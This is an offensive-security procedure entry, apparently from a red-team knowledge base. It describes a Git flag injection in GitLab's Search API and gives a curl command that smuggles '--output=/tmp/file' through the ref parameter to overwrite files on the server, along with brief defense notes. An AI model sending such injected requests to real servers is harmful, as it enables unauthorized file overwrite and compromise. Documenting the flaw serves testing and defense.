---
tags:
  - command-injection
  - file-overwrite
type: procedure
tools:
  - '[[tools/ssh]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Linux
  - Web
techniques:
  - '[[Unix Shell]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: d63fc3d3-f630-4564-9e26-972191380da2
created_at: '2025-12-11T03:47:47.598Z'
updated_at: '2025-12-11T03:47:47.598Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.004]]'
---
# Inject Git Flag via Search API to Overwrite File

## Summary

This procedure exploits the Git flag injection vulnerability in GitLab's Search API to inject arbitrary flags into git commands, enabling overwrite of local files with controlled content.

## Description

The ref parameter in the wiki_blobs scope is not sanitized, allowing injection like '--output=/tmp/file' into git log commands. This writes commit data to the specified file, potentially leading to security compromises. Prerequisites include a pre-created wiki page with controlled commit.

## Requirements

1. GitLab API token
2. Project ID with wiki
3. Network access to API endpoint

## Defense

Defensive measures and detection strategies:

- Sanitize API parameters
- Monitor for anomalous git commands in logs

## Objectives

1. Inject flag to redirect git output
2. Overwrite arbitrary file
3. Confirm exploitation

## Instructions

### Step 1: Execute API Call with Injection

**Context**: Call the search API with injected ref to trigger file write.

**Command** ([[commands/curl-gitlab-search-api]]):
```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

> This injects --output flag into git log, writing to /tmp/file.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques



## Commands Used

- [[commands/curl-gitlab-search-api]]

## Tools Used

- #curl

## Tags

- #command-injection
- [[procedures/Verify-File-Overwrite]]
